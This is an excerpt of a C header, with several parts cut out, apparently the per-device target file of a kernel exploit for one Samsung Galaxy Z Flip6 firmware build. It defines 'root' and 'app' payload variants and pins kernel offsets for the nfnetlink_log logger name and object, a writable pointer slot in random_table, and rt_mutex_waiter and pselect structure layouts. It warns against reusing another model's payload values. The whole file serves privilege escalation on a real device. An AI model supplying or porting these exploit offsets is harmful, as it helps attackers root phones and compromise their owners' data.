...
/*
 * Galaxy Z Flip6 (SM-F741B / b6q) — F741BXXS4DZG3
 *
 * Offline-derived from stock boot.img (exact uname match).
 * Closest published reference: e3q-S928USQS6DZF2 (same 6.1.145 GKI family).
 * Do NOT reuse e3q payloads: nfnetlink_log name string and P0 table differ.
 */

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "b6q-F741BXXS4DZG3-app-physical-p0-oracle"
#define APP_PHYS_P0_ORACLE 1
#else
#define BUILD_VARIANT_LABEL "b6q-F741BXXS4DZG3-root-umh"
#endif

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "samsung/b6qxxx/b6q:16/BP4A.251205.006/F741BXXS4DZG3:user/release-keys"
#endif
...
/* Compact waiter + e3q-class pselect layout */
...
#define P0_FINGERPRINT_HEADER \
  "targets/b6q-F741BXXS4DZG3/p0_fingerprint.h"
#endif
...
/* Image offsets from recovered vmlinux (base 0xffffffc008000000) */
...
/*
 * Name string is NOT the e3q value (e3q: 0x016a61b8).
 * Verified: nfulnl_logger->name == Image+0x016a61f4 ("nfnetlink_log").
 */
#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x016a61f4ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x02242a20ULL
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
/* random_table[boot_id].data field (writable pointer slot) */
...
/* compact rt_mutex_waiter (BTF size 0x58) — same as e3q */
...
/* Android 6.1 page layout (matches e3q/essi; BTF anonymized unions) */
